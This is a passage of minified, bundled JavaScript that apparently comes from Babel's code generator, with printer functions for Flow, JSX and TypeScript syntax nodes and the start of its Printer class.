mI1(X){let{explicitType:Q}=X;_Y(this,"string",Q),kY(this,X)}function uI1(X){_Y(this,"symbol",!0),kY(this,X)}function cI1(X){let{id:Q}=X;this.print(Q),this.tokenChar(44)}function Zz(X,Q){X.print(Q.id),X.space(),X.token("="),X.space(),X.print(Q.init),X.token(",")}function lI1(X){Zz(this,X)}function pI1(X){Zz(this,X)}function dI1(X){Zz(this,X)}function iI1(X){if(X.declaration){let Q=X.declaration;if(this.print(Q),!AI1(Q))this.semicolon()}else{if(this.tokenChar(123),X.specifiers.length)this.space(),this.printList(X.specifiers),this.space();if(this.tokenChar(125),X.source)this.space(),this.word("from"),this.space(),this.print(X.source);this.semicolon()}}function rI1(){this.tokenChar(42)}function nI1(X,Q){if(this.print(X.typeParameters),this.tokenChar(40),X.this){if(this.word("this"),this.tokenChar(58),this.space(),this.print(X.this.typeAnnotation),X.params.length||X.rest)this.tokenChar(44),this.space()}if(this.printList(X.params),X.rest){if(X.params.length)this.tokenChar(44),this.space();this.token("..."),this.print(X.rest)}this.tokenChar(41);let J=Q==null?void 0:Q.type;if(J!=null&&(J==="ObjectTypeCallProperty"||J==="ObjectTypeInternalSlot"||J==="DeclareFunction"||J==="ObjectTypeProperty"&&Q.method))this.tokenChar(58);else this.space(),this.token("=>");this.space(),this.print(X.returnType)}function aI1(X){if(this.print(X.name),X.optional)this.tokenChar(63);if(X.name)this.tokenChar(58),this.space();this.print(X.typeAnnotation)}function oI1(X){this.print(X.id),this.print(X.typeParameters,!0)}function sI1(X){var Q;if(this.print(X.id),this.print(X.typeParameters),(Q=X.extends)!=null&&Q.length)this.space(),this.word("extends"),this.space(),this.printList(X.extends);if(X.type==="DeclareClass"){var J,Y;if((J=X.mixins)!=null&&J.length)this.space(),this.word("mixins"),this.space(),this.printList(X.mixins);if((Y=X.implements)!=null&&Y.length)this.space(),this.word("implements"),this.space(),this.printList(X.implements)}this.space(),this.print(X.body)}function tI1(X){var Q;let J=(Q=X.variance)==null?void 0:Q.kind;if(J!=null){if(J==="plus")this.tokenChar(43);else if(J==="minus")this.tokenChar(45)}}function eI1(X){this.word("interface"),this.space(),this._interfaceish(X)}function XC1(X){this.space(),this.token("&",!1,X),this.space()}function QC1(X){var Q;if(this.word("interface"),(Q=X.extends)!=null&&Q.length)this.space(),this.word("extends"),this.space(),this.printList(X.extends);this.space(),this.print(X.body)}function JC1(X){this.printJoin(X.types,void 0,void 0,XC1)}function YC1(){this.word("mixed")}function WC1(){this.word("empty")}function GC1(X){this.tokenChar(63),this.print(X.typeAnnotation)}function HC1(){this.word("number")}function $C1(){this.word("string")}function zC1(){this.word("this")}function UC1(X){this.tokenChar(91),this.printList(X.types),this.tokenChar(93)}function KC1(X){this.word("typeof"),this.space(),this.print(X.argument)}function VC1(X){this.word("type"),this.space(),this.print(X.id),this.print(X.typeParameters),this.space(),this.tokenChar(61),this.space(),this.print(X.right),this.semicolon()}function BC1(X,Q){if(this.tokenChar(58),this.space(),Q.type==="ArrowFunctionExpression")this.tokenContext|=OI1.TokenContext.arrowFlowReturnType;else if(X.optional)this.tokenChar(63);this.print(X.typeAnnotation)}function qC1(X){this.tokenChar(60),this.printList(X.params),this.tokenChar(62)}function ZC1(X){if(this._variance(X),this.word(X.name),X.bound)this.print(X.bound);if(X.default)this.space(),this.tokenChar(61),this.space(),this.print(X.default)}function MC1(X){if(this.word("opaque"),this.space(),this.word("type"),this.space(),this.print(X.id),this.print(X.typeParameters),X.supertype)this.tokenChar(58),this.space(),this.print(X.supertype);if(X.impltype)this.space(),this.tokenChar(61),this.space(),this.print(X.impltype);this.semicolon()}function jC1(X){if(X.exact)this.token("{|");else this.tokenChar(123);let Q=[...X.properties,...X.callProperties||[],...X.indexers||[],...X.internalSlots||[]];if(Q.length)this.newline(),this.space(),this.printJoin(Q,!0,!0,void 0,void 0,function(Y){if(Y&&!Q[0])return 1},()=>{if(Q.length!==1||X.inexact)this.tokenChar(44),this.space()}),this.space();if(X.inexact){if(this.indent(),this.token("..."),Q.length)this.newline();this.dedent()}if(X.exact)this.token("|}");else this.tokenChar(125)}function FC1(X){if(X.static)this.word("static"),this.space();if(this.tokenChar(91),this.tokenChar(91),this.print(X.id),this.tokenChar(93),this.tokenChar(93),X.optional)this.tokenChar(63);if(!X.method)this.tokenChar(58),this.space();this.print(X.value)}function OC1(X){if(X.static)this.word("static"),this.space();this.print(X.value)}function AC1(X){if(X.static)this.word("static"),this.space();if(this._variance(X),this.tokenChar(91),X.id)this.print(X.id),this.tokenChar(58),this.space();this.print(X.key),this.tokenChar(93),this.tokenChar(58),this.space(),this.print(X.value)}function RC1(X){if(X.proto)this.word("proto"),this.space();if(X.static)this.word("static"),this.space();if(X.kind==="get"||X.kind==="set")this.word(X.kind),this.space();if(this._variance(X),this.print(X.key),X.optional)this.tokenChar(63);if(!X.method)this.tokenChar(58),this.space();this.print(X.value)}function LC1(X){this.token("..."),this.print(X.argument)}function DC1(X){this.print(X.qualification),this.tokenChar(46),this.print(X.id)}function NC1(){this.word("symbol")}function wC1(X){this.space(),this.token("|",!1,X),this.space()}function IC1(X){this.printJoin(X.types,void 0,void 0,wC1)}function CC1(X){this.tokenChar(40),this.print(X.expression),this.print(X.typeAnnotation),this.tokenChar(41)}function PC1(X){if(X.kind==="plus")this.tokenChar(43);else this.tokenChar(45)}function SC1(){this.word("void")}function EC1(X){this.print(X.objectType,!0),this.tokenChar(91),this.print(X.indexType),this.tokenChar(93)}function TC1(X){if(this.print(X.objectType),X.optional)this.token("?.");this.tokenChar(91),this.print(X.indexType),this.tokenChar(93)}});var VA=m((KA)=>{Object.defineProperty(KA,"__esModule",{value:!0});KA.BlockStatement=uP1;KA.Directive=cP1;KA.DirectiveLiteral=dP1;KA.File=gP1;KA.InterpreterDirective=iP1;KA.Placeholder=rP1;KA.Program=mP1;function gP1(X){if(X.program)this.print(X.program.interpreter);this.print(X.program)}function mP1(X){var Q;this.noIndentInnerCommentsHere(),this.printInnerComments();let J=(Q=X.directives)==null?void 0:Q.length;if(J){var Y;let W=X.body.length?2:1;if(this.printSequence(X.directives,void 0,W),!((Y=X.directives[J-1].trailingComments)!=null&&Y.length))this.newline(W)}this.printSequence(X.body)}function uP1(X){var Q;this.tokenChar(123);let J=this.enterDelimited(),Y=(Q=X.directives)==null?void 0:Q.length;if(Y){var W;let G=X.body.length?2:1;if(this.printSequence(X.directives,!0,G),!((W=X.directives[Y-1].trailingComments)!=null&&W.length))this.newline(G)}this.printSequence(X.body,!0),J(),this.rightBrace(X)}function cP1(X){this.print(X.value),this.semicolon()}var lP1=/(?:^|[^\\])(?:\\\\)*'/,pP1=/(?:^|[^\\])(?:\\\\)*"/;function dP1(X){let Q=this.getPossibleRaw(X);if(!this.format.minified&&Q!==void 0){this.token(Q);return}let{value:J}=X;if(!pP1.test(J))this.token(`"${J}"`);else if(!lP1.test(J))this.token(`'${J}'`);else throw Error("Malformed AST: it is not possible to print a directive containing both unescaped single and double quotes.")}function iP1(X){this.token(`#!${X.value}`),this.newline(1,!0)}function rP1(X){if(this.token("%%"),this.print(X.name),this.token("%%"),X.expectedNode==="Statement")this.semicolon()}});var qA=m((BA)=>{Object.defineProperty(BA,"__esModule",{value:!0});BA.JSXAttribute=QS1;BA.JSXClosingElement=BS1;BA.JSXClosingFragment=jS1;BA.JSXElement=US1;BA.JSXEmptyExpression=qS1;BA.JSXExpressionContainer=HS1;BA.JSXFragment=ZS1;BA.JSXIdentifier=JS1;BA.JSXMemberExpression=WS1;BA.JSXNamespacedName=YS1;BA.JSXOpeningElement=VS1;BA.JSXOpeningFragment=MS1;BA.JSXSpreadAttribute=GS1;BA.JSXSpreadChild=$S1;BA.JSXText=zS1;function QS1(X){if(this.print(X.name),X.value)this.tokenChar(61),this.print(X.value)}function JS1(X){this.word(X.name)}function YS1(X){this.print(X.namespace),this.tokenChar(58),this.print(X.name)}function WS1(X){this.print(X.object),this.tokenChar(46),this.print(X.property)}function GS1(X){this.tokenChar(123),this.token("..."),this.print(X.argument),this.rightBrace(X)}function HS1(X){this.tokenChar(123),this.print(X.expression),this.rightBrace(X)}function $S1(X){this.tokenChar(123),this.token("..."),this.print(X.expression),this.rightBrace(X)}function zS1(X){let Q=this.getPossibleRaw(X);if(Q!==void 0)this.token(Q,!0);else this.token(X.value,!0)}function US1(X){let Q=X.openingElement;if(this.print(Q),Q.selfClosing)return;this.indent();for(let J of X.children)this.print(J);this.dedent(),this.print(X.closingElement)}function KS1(){this.space()}function VS1(X){this.tokenChar(60),this.print(X.name);{if(X.typeArguments)this.print(X.typeArguments);this.print(X.typeParameters)}if(X.attributes.length>0)this.space(),this.printJoin(X.attributes,void 0,void 0,KS1);if(X.selfClosing)this.space(),this.tokenChar(47);this.tokenChar(62)}function BS1(X){this.tokenChar(60),this.tokenChar(47),this.print(X.name),this.tokenChar(62)}function qS1(){this.printInnerComments()}function ZS1(X){this.print(X.openingFragment),this.indent();for(let Q of X.children)this.print(Q);this.dedent(),this.print(X.closingFragment)}function MS1(){this.tokenChar(60),this.tokenChar(62)}function jS1(){this.token("</"),this.tokenChar(62)}});var AA=m((OA)=>{Object.defineProperty(OA,"__esModule",{value:!0});OA.TSAnyKeyword=dS1;OA.TSArrayType=BE1;OA.TSSatisfiesExpression=OA.TSAsExpression=_E1;OA.TSBigIntKeyword=iS1;OA.TSBooleanKeyword=oS1;OA.TSCallSignatureDeclaration=gS1;OA.TSInterfaceHeritage=OA.TSClassImplements=PE1;OA.TSConditionalType=AE1;OA.TSConstructSignatureDeclaration=mS1;OA.TSConstructorType=HE1;OA.TSDeclareFunction=fS1;OA.TSDeclareMethod=hS1;OA.TSEnumBody=FA;OA.TSEnumDeclaration=vE1;OA.TSEnumMember=xE1;OA.TSExportAssignment=cE1;OA.TSExternalModuleReference=mE1;OA.TSFunctionType=GE1;OA.TSImportEqualsDeclaration=gE1;OA.TSImportType=yE1;OA.TSIndexSignature=pS1;OA.TSIndexedAccessType=NE1;OA.TSInferType=RE1;OA.TSInstantiationExpression=bE1;OA.TSInterfaceBody=EE1;OA.TSInterfaceDeclaration=SE1;OA.TSIntersectionType=OE1;OA.TSIntrinsicKeyword=YE1;OA.TSLiteralType=CE1;OA.TSMappedType=wE1;OA.TSMethodSignature=lS1;OA.TSModuleBlock=hE1;OA.TSModuleDeclaration=fE1;OA.TSNamedTupleMember=jE1;OA.TSNamespaceExportDeclaration=lE1;OA.TSNeverKeyword=JE1;OA.TSNonNullExpression=uE1;OA.TSNullKeyword=QE1;OA.TSNumberKeyword=nS1;OA.TSObjectKeyword=aS1;OA.TSOptionalType=ZE1;OA.TSParameterProperty=xS1;OA.TSParenthesizedType=LE1;OA.TSPropertySignature=uS1;OA.TSQualifiedName=yS1;OA.TSRestType=ME1;OA.TSStringKeyword=sS1;OA.TSSymbolKeyword=tS1;OA.TSTemplateLiteralType=IE1;OA.TSThisType=WE1;OA.TSTupleType=qE1;OA.TSTypeAliasDeclaration=TE1;OA.TSTypeAnnotation=kS1;OA.TSTypeAssertion=kE1;OA.TSTypeLiteral=VE1;OA.TSTypeOperator=DE1;OA.TSTypeParameter=vS1;OA.TSTypeParameterDeclaration=OA.TSTypeParameterInstantiation=bS1;OA.TSTypePredicate=UE1;OA.TSTypeQuery=KE1;OA.TSTypeReference=zE1;OA.TSUndefinedKeyword=XE1;OA.TSUnionType=FE1;OA.TSUnknownKeyword=rS1;OA.TSVoidKeyword=eS1;OA.tsPrintClassMemberModifiers=dE1;OA.tsPrintFunctionOrConstructorType=$E1;OA.tsPrintPropertyOrMethodName=cS1;OA.tsPrintSignatureDeclarationBase=pE1;function kS1(X,Q){if(this.token((Q.type==="TSFunctionType"||Q.type==="TSConstructorType")&&Q.typeAnnotation===X?"=>":":"),this.space(),X.optional)this.tokenChar(63);this.print(X.typeAnnotation)}function bS1(X,Q){this.tokenChar(60);let J=Q.type==="ArrowFunctionExpression"&&X.params.length===1;if(this.tokenMap&&X.start!=null&&X.end!=null)J&&(J=!!this.tokenMap.find(X,(Y)=>this.tokenMap.matchesOriginal(Y,","))),J||(J=this.shouldPrintTrailingComma(">"));this.printList(X.params,J),this.tokenChar(62)}function vS1(X){if(X.const)this.word("const"),this.space();if(X.in)this.word("in"),this.space();if(X.out)this.word("out"),this.space();if(this.word(X.name),X.constraint)this.space(),this.word("extends"),this.space(),this.print(X.constraint);if(X.default)this.space(),this.tokenChar(61),this.space(),this.print(X.default)}function xS1(X){if(X.accessibility)this.word(X.accessibility),this.space();if(X.readonly)this.word("readonly"),this.space();this._param(X.parameter)}function fS1(X,Q){if(X.declare)this.word("declare"),this.space();this._functionHead(X,Q),this.semicolon()}function hS1(X){this._classMethodHead(X),this.semicolon()}function yS1(X){this.print(X.left),this.tokenChar(46),this.print(X.right)}function gS1(X){this.tsPrintSignatureDeclarationBase(X),JQ(this,X)}function JQ(X,Q){if(!X.tokenMap||!Q.start||!Q.end){X.semicolon();return}if(X.tokenMap.endMatches(Q,","))X.token(",");else if(X.tokenMap.endMatches(Q,";"))X.semicolon()}function mS1(X){this.word("new"),this.space(),this.tsPrintSignatureDeclarationBase(X),JQ(this,X)}function uS1(X){let{readonly:Q}=X;if(Q)this.word("readonly"),this.space();this.tsPrintPropertyOrMethodName(X),this.print(X.typeAnnotation),JQ(this,X)}function cS1(X){if(X.computed)this.tokenChar(91);if(this.print(X.key),X.computed)this.tokenChar(93);if(X.optional)this.tokenChar(63)}function lS1(X){let{kind:Q}=X;if(Q==="set"||Q==="get")this.word(Q),this.space();this.tsPrintPropertyOrMethodName(X),this.tsPrintSignatureDeclarationBase(X),JQ(this,X)}function pS1(X){let{readonly:Q,static:J}=X;if(J)this.word("static"),this.space();if(Q)this.word("readonly"),this.space();this.tokenChar(91),this._parameters(X.parameters,"]"),this.print(X.typeAnnotation),JQ(this,X)}function dS1(){this.word("any")}function iS1(){this.word("bigint")}function rS1(){this.word("unknown")}function nS1(){this.word("number")}function aS1(){this.word("object")}function oS1(){this.word("boolean")}function sS1(){this.word("string")}function tS1(){this.word("symbol")}function eS1(){this.word("void")}function XE1(){this.word("undefined")}function QE1(){this.word("null")}function JE1(){this.word("never")}function YE1(){this.word("intrinsic")}function WE1(){this.word("this")}function GE1(X){this.tsPrintFunctionOrConstructorType(X)}function HE1(X){if(X.abstract)this.word("abstract"),this.space();this.word("new"),this.space(),this.tsPrintFunctionOrConstructorType(X)}function $E1(X){let{typeParameters:Q}=X,J=X.parameters;this.print(Q),this.tokenChar(40),this._parameters(J,")"),this.space();let Y=X.typeAnnotation;this.print(Y)}function zE1(X){let Q=X.typeParameters;this.print(X.typeName,!!Q),this.print(Q)}function UE1(X){if(X.asserts)this.word("asserts"),this.space();if(this.print(X.parameterName),X.typeAnnotation)this.space(),this.word("is"),this.space(),this.print(X.typeAnnotation.typeAnnotation)}function KE1(X){this.word("typeof"),this.space(),this.print(X.exprName);let Q=X.typeParameters;if(Q)this.print(Q)}function VE1(X){vY(this,X,()=>this.printJoin(X.members,!0,!0))}function BE1(X){this.print(X.elementType,!0),this.tokenChar(91),this.tokenChar(93)}function qE1(X){this.tokenChar(91),this.printList(X.elementTypes,this.shouldPrintTrailingComma("]")),this.tokenChar(93)}function ZE1(X){this.print(X.typeAnnotation),this.tokenChar(63)}function ME1(X){this.token("..."),this.print(X.typeAnnotation)}function jE1(X){if(this.print(X.label),X.optional)this.tokenChar(63);this.tokenChar(58),this.space(),this.print(X.elementType)}function FE1(X){jA(this,X,"|")}function OE1(X){jA(this,X,"&")}function jA(X,Q,J){var Y;let W=0;if((Y=X.tokenMap)!=null&&Y.startMatches(Q,J))W=1,X.token(J);X.printJoin(Q.types,void 0,void 0,function(G){this.space(),this.token(J,null,G+W),this.space()})}function AE1(X){this.print(X.checkType),this.space(),this.word("extends"),this.space(),this.print(X.extendsType),this.space(),this.tokenChar(63),this.space(),this.print(X.trueType),this.space(),this.tokenChar(58),this.space(),this.print(X.falseType)}function RE1(X){this.word("infer"),this.print(X.typeParameter)}function LE1(X){this.tokenChar(40),this.print(X.typeAnnotation),this.tokenChar(41)}function DE1(X){this.word(X.operator),this.space(),this.print(X.typeAnnotation)}function NE1(X){this.print(X.objectType,!0),this.tokenChar(91),this.print(X.indexType),this.tokenChar(93)}function wE1(X){let{nameType:Q,optional:J,readonly:Y,typeAnnotation:W}=X;this.tokenChar(123);let G=this.enterDelimited();if(this.space(),Y)ZA(this,Y),this.word("readonly"),this.space();if(this.tokenChar(91),this.word(X.typeParameter.name),this.space(),this.word("in"),this.space(),this.print(X.typeParameter.constraint),Q)this.space(),this.word("as"),this.space(),this.print(Q);if(this.tokenChar(93),J)ZA(this,J),this.tokenChar(63);if(W)this.tokenChar(58),this.space(),this.print(W);this.space(),G(),this.tokenChar(125)}function ZA(X,Q){if(Q!==!0)X.token(Q)}function IE1(X){this._printTemplate(X,X.types)}function CE1(X){this.print(X.literal)}function PE1(X){this.print(X.expression),this.print(X.typeArguments)}function SE1(X){let{declare:Q,id:J,typeParameters:Y,extends:W,body:G}=X;if(Q)this.word("declare"),this.space();if(this.word("interface"),this.space(),this.print(J),this.print(Y),W!=null&&W.length)this.space(),this.word("extends"),this.space(),this.printList(W);this.space(),this.print(G)}function EE1(X){vY(this,X,()=>this.printJoin(X.body,!0,!0))}function TE1(X){let{declare:Q,id:J,typeParameters:Y,typeAnnotation:W}=X;if(Q)this.word("declare"),this.space();this.word("type"),this.space(),this.print(J),this.print(Y),this.space(),this.tokenChar(61),this.space(),this.print(W),this.semicolon()}function _E1(X){let{type:Q,expression:J,typeAnnotation:Y}=X;this.print(J,!0),this.space(),this.word(Q==="TSAsExpression"?"as":"satisfies"),this.space(),this.print(Y)}function kE1(X){let{typeAnnotation:Q,expression:J}=X;this.tokenChar(60),this.print(Q),this.tokenChar(62),this.space(),this.print(J)}function bE1(X){this.print(X.expression),this.print(X.typeParameters)}function vE1(X){let{declare:Q,const:J,id:Y}=X;if(Q)this.word("declare"),this.space();if(J)this.word("const"),this.space();this.word("enum"),this.space(),this.print(Y),this.space(),FA.call(this,X)}function FA(X){vY(this,X,()=>{var Q;return this.printList(X.members,(Q=this.shouldPrintTrailingComma("}"))!=null?Q:!0,!0,!0)})}function xE1(X){let{id:Q,initializer:J}=X;if(this.print(Q),J)this.space(),this.tokenChar(61),this.space(),this.print(J)}function fE1(X){let{declare:Q,id:J,kind:Y}=X;if(Q)this.word("declare"),this.space();{if(!X.global)this.word(Y!=null?Y:J.type==="Identifier"?"namespace":"module"),this.space();if(this.print(J),!X.body){this.semicolon();return}let W=X.body;while(W.type==="TSModuleDeclaration")this.tokenChar(46),this.print(W.id),W=W.body;this.space(),this.print(W)}}function hE1(X){vY(this,X,()=>this.printSequence(X.body,!0))}function yE1(X){let{argument:Q,qualifier:J,options:Y}=X;if(this.word("import"),this.tokenChar(40),this.print(Q),Y)this.tokenChar(44),this.print(Y);if(this.tokenChar(41),J)this.tokenChar(46),this.print(J);let W=X.typeParameters;if(W)this.print(W)}function gE1(X){let{id:Q,moduleReference:J}=X;if(X.isExport)this.word("export"),this.space();this.word("import"),this.space(),this.print(Q),this.space(),this.tokenChar(61),this.space(),this.print(J),this.semicolon()}function mE1(X){this.token("require("),this.print(X.expression),this.tokenChar(41)}function uE1(X){this.print(X.expression),this.tokenChar(33)}function cE1(X){this.word("export"),this.space(),this.tokenChar(61),this.space(),this.print(X.expression),this.semicolon()}function lE1(X){this.word("export"),this.space(),this.word("as"),this.space(),this.word("namespace"),this.space(),this.print(X.id),this.semicolon()}function pE1(X){let{typeParameters:Q}=X,J=X.parameters;this.print(Q),this.tokenChar(40),this._parameters(J,")");let Y=X.typeAnnotation;this.print(Y)}function dE1(X){let Q=X.type==="ClassPrivateProperty",J=X.type==="ClassAccessorProperty"||X.type==="ClassProperty";if(MA(this,X,[J&&X.declare&&"declare",!Q&&X.accessibility]),X.static)this.word("static"),this.space();MA(this,X,[!Q&&X.abstract&&"abstract",!Q&&X.override&&"override",(J||Q)&&X.readonly&&"readonly"])}function vY(X,Q,J){X.token("{");let Y=X.enterDelimited();J(),Y(),X.rightBrace(Q)}function MA(X,Q,J){var Y;let W=new Set;for(let G of J)if(G)W.add(G);(Y=X.tokenMap)==null||Y.find(Q,(G)=>{if(W.has(G.value))return X.token(G.value),X.space(),W.delete(G.value),W.size===0});for(let G of W)X.word(G),X.space()}});var RA=m((F0)=>{Object.defineProperty(F0,"__esModule",{value:!0});var Mz=fO();Object.keys(Mz).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in F0&&F0[X]===Mz[X])return;Object.defineProperty(F0,X,{enumerable:!0,get:function(){return Mz[X]}})});var jz=gO();Object.keys(jz).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in F0&&F0[X]===jz[X])return;Object.defineProperty(F0,X,{enumerable:!0,get:function(){return jz[X]}})});var Fz=dO();Object.keys(Fz).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in F0&&F0[X]===Fz[X])return;Object.defineProperty(F0,X,{enumerable:!0,get:function(){return Fz[X]}})});var Oz=rO();Object.keys(Oz).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in F0&&F0[X]===Oz[X])return;Object.defineProperty(F0,X,{enumerable:!0,get:function(){return Oz[X]}})});var Az=aO();Object.keys(Az).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in F0&&F0[X]===Az[X])return;Object.defineProperty(F0,X,{enumerable:!0,get:function(){return Az[X]}})});var Rz=Kz();Object.keys(Rz).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in F0&&F0[X]===Rz[X])return;Object.defineProperty(F0,X,{enumerable:!0,get:function(){return Rz[X]}})});var Lz=qz();Object.keys(Lz).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in F0&&F0[X]===Lz[X])return;Object.defineProperty(F0,X,{enumerable:!0,get:function(){return Lz[X]}})});var Dz=UA();Object.keys(Dz).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in F0&&F0[X]===Dz[X])return;Object.defineProperty(F0,X,{enumerable:!0,get:function(){return Dz[X]}})});var Nz=VA();Object.keys(Nz).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in F0&&F0[X]===Nz[X])return;Object.defineProperty(F0,X,{enumerable:!0,get:function(){return Nz[X]}})});var wz=qA();Object.keys(wz).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in F0&&F0[X]===wz[X])return;Object.defineProperty(F0,X,{enumerable:!0,get:function(){return wz[X]}})});var Iz=AA();Object.keys(Iz).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in F0&&F0[X]===Iz[X])return;Object.defineProperty(F0,X,{enumerable:!0,get:function(){return Iz[X]}})})});var DA=m((LA)=>{Object.defineProperty(LA,"__esModule",{value:!0});LA.addDeprecatedGenerators=$_1;function $_1(X){{let Q={Noop(){},TSExpressionWithTypeArguments(J){this.print(J.expression),this.print(J.typeParameters)},DecimalLiteral(J){let Y=this.getPossibleRaw(J);if(!this.format.minified&&Y!==void 0){this.word(Y);return}this.word(J.value+"m")}};Object.assign(X.prototype,Q)}}});var SA=m((CA)=>{Object.defineProperty(CA,"__esModule",{value:!0});CA.default=void 0;var U_1=UO(),R9=Y7(),wA=R9,K_1=$0(),V_1=vO(),B_1=RA(),q_1=DA(),{isExpression:Z_1,isFunction:M_1,isStatement:j_1,isClassBody:F_1,isTSInterfaceBody:O_1,isTSEnumMember:A_1}=K_1,R_1=/e/i,L_1=/\.0+$/,IA=/[\n\r\u2028\u2029]/,D_1=/[\n\r\u2028\u2029]|\*\//;function NA(X){return X.type==="CommentLine"||IA.test(X.value)}var{needsParens:N_1}=wA;class xY{constructor(X,Q,J,Y){this.tokenContext=R9.TokenContext.normal,this._tokens=null,this._originalCode=null,this._currentNode=null,this._indent=0,this._indentRepeat=0,this._insideAux=!1,this._noLineTerminator=!1,this._noLineTerminatorAfterNode=null,this._printAuxAfterOnNextUserNode=!1,this._printedComments=new Set,this._endsWithInteger=!1,this._endsWithWord=!1,this._endsWithDiv=!1,this._lastCommentLine=0,this._endsWithInnerRaw=!1,this._indentInnerComments=!0,this.tokenMap=null,this._boundGetRawIdentifier=this._getRawIdentifier.bind(this),this._printSemicolonBeforeNextNode=-1,this._printSemicolonBeforeNextToken=-1,this.format=X,this._tokens=J,this._originalCode=Y,this._indentRepeat=X.indent.style.length,this._inputMap=Q==null?void 0:Q._inputMap,this._buf=new U_1.default(Q,X.indent.style[0])}enterForStatementInit(){return this.tokenContext|=R9.TokenContext.forInitHead|R9.TokenContext.forInOrInitHeadAccumulate,()=>this.tokenContext=R9.TokenContext.normal}enterForXStatementInit(X){if(X)return this.tokenContext|=R9.TokenContext.forOfHead,null;else return this.tokenContext|=R9.TokenContext.forInHead|R9.TokenContext.forInOrInitHeadAccumulate,()=>this.tokenContext=R9.TokenContext.normal}enterDelimited(){let X=this.tokenContext,Q=this._noLineTerminatorAfterNode;if(!(X&R9.TokenContext.forInOrInitHeadAccumulate)&&Q===null)return()=>{};return this._noLineTerminatorAfterNode=null,this.tokenContext=R9.TokenContext.normal,()=>{this._noLineTerminatorAfterNode=Q,this.tokenContext=X}}generate(X){if(this.format.preserveFormat)this.tokenMap=new V_1.TokenMap(X,this._tokens,this._originalCode);return this.print(X),this._maybeAddAuxComment(),this._buf.get()}indent(){let{format:X}=this;if(X.preserveFormat||X.compact||X.concise)return;this._indent++}dedent(){let{format:X}=this;if(X.preserveFormat||X.compact||X.concise)return;this._indent--}semicolon(X=!1){if(this._maybeAddAuxComment(),X){this._appendChar(59),this._noLineTerminator=!1;return}if(this.tokenMap){let Q=this._currentNode;if(Q.start!=null&&Q.end!=null){if(!this.tokenMap.endMatches(Q,";")){this._printSemicolonBeforeNextNode=this._buf.getCurrentLine();return}let J=this.tokenMap.getIndexes(this._currentNode);this._catchUpTo(this._tokens[J[J.length-1]].loc.start)}}this._queue(59),this._noLineTerminator=!1}rightBrace(X){if(this.format.minified)this._buf.removeLastSemicolon();this.sourceWithOffset("end",X.loc,-1),this.tokenChar(125)}rightParens(X){this.sourceWithOffset("end",X.loc,-1),this.tokenChar(41)}space(X=!1){let{format:Q}=this;if(Q.compact||Q.preserveFormat)return;if(X)this._space();else if(this._buf.hasContent()){let J=this.getLastChar();if(J!==32&&J!==10)this._space()}}word(X,Q=!1){if(this.tokenContext&=R9.TokenContext.forInOrInitHeadAccumulatePassThroughMask,this._maybePrintInnerComments(X),this._maybeAddAuxComment(),this.tokenMap)this._catchUpToCurrentToken(X);if(this._endsWithWord||this._endsWithDiv&&X.charCodeAt(0)===47)this._space();this._append(X,!1),this._endsWithWord=!0,this._noLineTerminator=Q}number(X,Q){function J(Y){if(Y.length>2&&Y.charCodeAt(0)===48){let W=Y.charCodeAt(1);return W===98||W===111||W===120}return!1}this.word(X),this._endsWithInteger=Number.isInteger(Q)&&!J(X)&&!R_1.test(X)&&!L_1.test(X)&&X.charCodeAt(X.length-1)!==46}token(X,Q=!1,J=0){if(this.tokenContext&=R9.TokenContext.forInOrInitHeadAccumulatePassThroughMask,this._maybePrintInnerComments(X,J),this._maybeAddAuxComment(),this.tokenMap)this._catchUpToCurrentToken(X,J);let Y=this.getLastChar(),W=X.charCodeAt(0);if(Y===33&&(X==="--"||W===61)||W===43&&Y===43||W===45&&Y===45||W===46&&this._endsWithInteger)this._space();this._append(X,Q),this._noLineTerminator=!1}tokenChar(X){this.tokenContext&=R9.TokenContext.forInOrInitHeadAccumulatePassThroughMask;let Q=String.fromCharCode(X);if(this._maybePrintInnerComments(Q),this._maybeAddAuxComment(),this.tokenMap)this._catchUpToCurrentToken(Q);let J=this.getLastChar();if(X===43&&J===43||X===45&&J===45||X===46&&this._endsWithInteger)this._space();this._appendChar(X),this._noLineTerminator=!1}newline(X=1,Q){if(X<=0)return;if(!Q){if(this.format.retainLines||this.format.compact)return;if(this.format.concise){this.space();return}}if(X>2)X=2;X-=this._buf.getNewlineCount();for(let J=0;J<X;J++)this._newline();return}endsWith(X){return this.getLastChar()===X}getLastChar(){return this._buf.getLastChar()}endsWithCharAndNewline(){return this._buf.endsWithCharAndNewline()}removeTrailingNewline(){this._buf.removeTrailingNewline()}exactSource(X,Q){if(!X){Q();return}this._catchUp("start",X),this._buf.exactSource(X,Q)}source(X,Q){if(!Q)return;this._catchUp(X,Q),this._buf.source(X,Q)}sourceWithOffset(X,Q,J){if(!Q||this.format.preserveFormat)return;this._catchUp(X,Q),this._buf.sourceWithOffset(X,Q,J)}sourceIdentifierName(X,Q){if(!this._buf._canMarkIdName)return;let J=this._buf._sourcePosition;J.identifierNamePos=Q,J.identifierName=X}_space(){this._queue(32)}_newline(){this._queue(10)}_catchUpToCurrentToken(X,Q=0){let J=this.tokenMap.findMatching(this._currentNode,X,Q);if(J)this._catchUpTo(J.loc.start);if(this._printSemicolonBeforeNextToken!==-1&&this._printSemicolonBeforeNextToken===this._buf.getCurrentLine())this._buf.appendChar(59),this._endsWithWord=!1,this._endsWithInteger=!1,this._endsWithDiv=!1;this._printSemicolonBeforeNextToken=-1,this._printSemicolonBeforeNextNode=-1}_append(X,Q){this._maybeIndent(X.charCodeAt(0)),this._buf.append(X,Q),this._endsWithWord=!1,this._endsWithInteger=!1,this._endsWithDiv=!1}_appendChar(X){this._maybeIndent(X),this._buf.appendChar(X),this._endsWithWord=!1,this._endsWithInteger=!1,this._endsWithDiv=!1}_queue(X){this._maybeIndent(X),this._buf.queue(X),this._endsWithWord=!1,this._endsWithInteger=!1}_maybeIndent(X){if(this._indent&&X!==10&&this.endsWith(10))this._buf.queueIndentation(this._getIndent())}_shouldIndent(X){if(this._indent&&X!==10&&this.endsWith(10))return!0}catchUp(X){if(!this.format.retainLines)return;let Q=X-this._buf.getCurrentLine();for(let 